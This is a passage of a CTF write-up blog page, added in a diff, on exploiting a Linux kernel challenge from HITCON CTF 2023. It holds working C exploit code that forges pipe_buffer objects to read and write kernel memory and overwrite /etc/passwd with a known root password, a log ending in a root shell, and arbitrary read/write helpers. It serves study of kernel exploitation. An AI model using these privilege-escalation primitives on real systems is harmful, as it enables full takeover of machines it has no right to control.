+        <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="n">pipe</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="p">.</span><span class="n">page</span> <span class="o">=</span> <span class="n">phys_to_page</span><span class="p">(</span><span class="n">virt_to_phys</span><span class="p">(</span><span class="n">page_offset</span> <span class="o">+</span> <span class="n">moff</span><span class="p">)),</span>
+            <span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x4</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">ops</span> <span class="o">=</span> <span class="n">pbuf_ops</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">priv</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">};</span>
+
+        <span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pipe</span><span class="p">;</span>
+        <span class="n">moff</span> <span class="o">+=</span> <span class="mh">0x1000</span><span class="p">;</span>
+
+        <span class="n">setxattr</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="s">"attr"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+        <span class="n">read</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">r</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+
+        <span class="n">ptr</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">;</span>
+        <span class="n">mpqw</span> <span class="o">=</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">moff</span> <span class="o">-=</span> <span class="mh">0x1000</span><span class="p">;</span>
+
+    <span class="k">return</span> <span class="n">moff</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">exploit_passwd</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">page_offset</span> <span class="o">=</span> <span class="n">moduleheap</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x3fffffff</span><span class="p">);</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">moff</span> <span class="o">=</span> <span class="n">find_passwd_off</span><span class="p">();</span>
+
+    <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="n">pbfs</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+
+    <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="n">pipe</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">page</span> <span class="o">=</span> <span class="n">phys_to_page</span><span class="p">(</span><span class="n">virt_to_phys</span><span class="p">(</span><span class="n">page_offset</span> <span class="o">+</span> <span class="n">moff</span><span class="p">)),</span>
+        <span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">ops</span> <span class="o">=</span> <span class="n">pbuf_ops</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">priv</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">};</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">pbfs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">pipe</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pbfs</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"offset: %#llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">moff</span><span class="p">);</span>
+
+    <span class="n">setxattr</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="s">"attr"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"root:$1$3S6VifHx$WxudbKqG7.8g7dwuUg0H30:0:0:root:/root:/bin/sh</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">w</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Password: passwd</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"su"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>So, in <code class="language-plaintext highlighter-rouge">find_passwd_off</code> we use the pipe again to read kernel memory until we find the content of <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, but this time taking note of the offset to our <code class="language-plaintext highlighter-rouge">data</code> chunk. Knowing the offset from the current <code class="language-plaintext highlighter-rouge">data</code> page, we can properly setup a <code class="language-plaintext highlighter-rouge">pipe_buffer</code> to overwrite data at a specific address.</p>
+
+<p>After searching the offset, we just fixed the <code class="language-plaintext highlighter-rouge">pipe</code> by creating multiple <code class="language-plaintext highlighter-rouge">pipe_buffer</code> objects pointing to <code class="language-plaintext highlighter-rouge">/etc/passwd</code> and wrote them back into <code class="language-plaintext highlighter-rouge">data</code>. Then we can use the <code class="language-plaintext highlighter-rouge">pipe</code> to overwrite the data in <code class="language-plaintext highlighter-rouge">/etc/passwd</code> (put a known password for <code class="language-plaintext highlighter-rouge">root</code>). All that’s left is to execute <code class="language-plaintext highlighter-rouge">su</code> and manually enter the set password (<code class="language-plaintext highlighter-rouge">passwd</code>) to get a proper root shell.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Init devices
+Free data
+Put msg_seq in freed data
+Free msg_seq
+Create pipe
+Fill pipe buffers in freed data
+Free pipes
+Put msg_seq in data aligned with pipe buffers
+
+Pipe-&gt;page    : 0xffffeb26400949c0
+Pipe-&gt;offset  : 0
+Pipe-&gt;len     : 0x1000
+Pipe-&gt;ops     : 0xffffffff85a1df80
+Pipe-&gt;flags   : 0x10
+Pipe-&gt;private : 0
+
+Kernel base   : 0xffffffff84400000
+VMEMMAP base  : 0xffffeb2640000000
+modprobe_path : 0xffffffff86051e20
+
+Found moduletext : 0xffffffffc03cb000
+Found moduleread : 0xffffffffc03cc036
+Found modulebss  : 0xffffffffc03cd0a0
+Found moduleheap : 0xffff8fea81188800
+
+Search passwd region page offsetoffset: 0x23fe7000
+Password: passwd
+Password: passwd
+
+/home/user # id
+id
+uid=0(root) gid=0(root) groups=0(root),10(wheel)
+/home/user # </code></pre></figure>
+
+<h1 id="enhancing-the-exploit-for-arbitrary-read--write">Enhancing the exploit for arbitrary read / write</h1>
+
+<p>Though, after getting the idea of using the offset to a known address for setting up proper <code class="language-plaintext highlighter-rouge">pipe_buffer</code> objects, I cleaned up the exploit and extended it a bit.</p>
+
+<p>To find an offset to a known address in kernel mapping, I just used the same approach again to find <code class="language-plaintext highlighter-rouge">modprobe_path</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">find_modprobe_off</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Search modprobe_path region page offset"</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">mpqw</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">moff</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">page_offset</span> <span class="o">=</span> <span class="n">moduleheap</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x3fffffff</span><span class="p">);</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="n">mpqw</span> <span class="o">!=</span> <span class="n">MODPROBE_QW</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="n">pipe</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="p">.</span><span class="n">page</span> <span class="o">=</span> <span class="n">phys_to_page</span><span class="p">(</span><span class="n">virt_to_phys</span><span class="p">(</span><span class="n">page_offset</span> <span class="o">+</span> <span class="n">moff</span><span class="p">)),</span>
+            <span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0xe20</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">ops</span> <span class="o">=</span> <span class="n">pbuf_ops</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">priv</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">};</span>
+
+        <span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pipe</span><span class="p">;</span>
+        <span class="n">moff</span> <span class="o">+=</span> <span class="mh">0x1000</span><span class="p">;</span>
+
+        <span class="n">setxattr</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="s">"attr"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+        <span class="n">read</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">r</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+
+        <span class="n">ptr</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">;</span>
+        <span class="n">mpqw</span> <span class="o">=</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">moff</span> <span class="o">-=</span> <span class="mh">0x1000</span><span class="p">;</span>
+
+    <span class="k">return</span> <span class="n">moff</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Since we now know the offset to <code class="language-plaintext highlighter-rouge">modprobe_path</code> (and we also know the real address of it), we can now calculate offsets to any other address based on this.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">read_address</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">moff</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="n">pbfs</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">target_addr</span> <span class="o">=</span> <span class="n">address</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">target_page_off</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">&lt;</span> <span class="n">modprobe_addr</span><span class="p">)</span>
+        <span class="n">target_page_off</span> <span class="o">=</span> <span class="n">moff</span> <span class="o">-</span> <span class="p">(</span><span class="n">modprobe_addr</span> <span class="o">-</span> <span class="mh">0xe20</span> <span class="o">-</span> <span class="p">(</span><span class="n">target_addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">)));</span>
+    <span class="k">else</span>
+        <span class="n">target_page_off</span> <span class="o">=</span> <span class="n">moff</span> <span class="o">+</span> <span class="p">((</span><span class="n">target_addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">-</span> <span class="p">(</span><span class="n">modprobe_addr</span> <span class="o">-</span> <span class="mh">0xe20</span><span class="p">));</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">target_offset</span> <span class="o">=</span> <span class="n">target_addr</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">;</span>
+
+    <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="n">pipe</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">page</span> <span class="o">=</span> <span class="n">phys_to_page</span><span class="p">(</span><span class="n">virt_to_phys</span><span class="p">(</span><span class="n">page_offset</span> <span class="o">+</span> <span class="n">target_page_off</span><span class="p">)),</span>
+        <span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">target_offset</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">size</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">ops</span> <span class="o">=</span> <span class="n">pbuf_ops</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">priv</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">};</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+        <span class="n">pbfs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">pipe</span><span class="p">;</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pbfs</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="n">setxattr</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="s">"attr"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">read</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">r</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">write_address</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">moff</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="n">pbfs</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">target_addr</span> <span class="o">=</span> <span class="n">address</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">target_page_off</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">&lt;</span> <span class="n">modprobe_addr</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">target_page_off</span> <span class="o">=</span> <span class="n">moff</span> <span class="o">-</span> <span class="p">(</span><span class="n">modprobe_addr</span> <span class="o">-</span> <span class="mh">0xe20</span> <span class="o">-</span> <span class="p">(</span><span class="n">target_addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">)));</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">target_page_off</span> <span class="o">=</span> <span class="n">moff</span> <span class="o">+</span> <span class="p">((</span><span class="n">target_addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">-</span> <span class="p">(</span><span class="n">modprobe_addr</span> <span class="o">-</span> <span class="mh">0xe20</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">target_offset</span> <span class="o">=</span> <span class="n">target_addr</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">;</span>
+
+    <span class="c1">// For read set len, for write set len to 0x0</span>
+    <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="n">pipe</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">page</span> <span class="o">=</span> <span class="n">phys_to_page</span><span class="p">(</span><span class="n">virt_to_phys</span><span class="p">(</span><span class="n">page_offset</span> <span class="o">+</span> <span class="n">target_page_off</span><span class="p">)),</span>
+        <span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">target_offset</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">ops</span> <span class="o">=</span> <span class="n">pbuf_ops</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">priv</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">};</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+        <span class="n">pbfs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">pipe</span><span class="p">;</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pbfs</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="n">setxattr</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="s">"attr"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">w</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">...</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">moff</span> <span class="o">=</span> <span class="n">find_modprobe_off</span><span class="p">();</span>
+
+<span class="n">read_address</span><span class="p">(</span><span class="n">kernel_base</span><span class="p">,</span> <span class="n">moff</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+<span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+<span class="p">...</span></code></pre></figure>
+
+<p>Though this was just to get a better understanding of <code class="language-plaintext highlighter-rouge">pipe_buffer</code>, these functions could now also have been used to find specific functions or rop gadgets in the kernel (defeating FG-KASLR).</p>
+
+<p>If using <code class="language-plaintext highlighter-rouge">su</code> would not have been available, we could have used this then to hunt for gadgets and prepare a rop chain instead.</p>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=HITCON CTF 2023 Quals - Full Chain - Wall Rose&amp;url=https://kileak.github.io/ctf/2023/hitcon23-rose/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2023/hitcon23-rose/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2023/hitcon23-rose';
+        var disqus_title = 'HITCON CTF 2023 Quals - Full Chain - Wall Rose';
+        var disqus_url = 'https://kileak.github.io/ctf/2023/hitcon23-rose';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
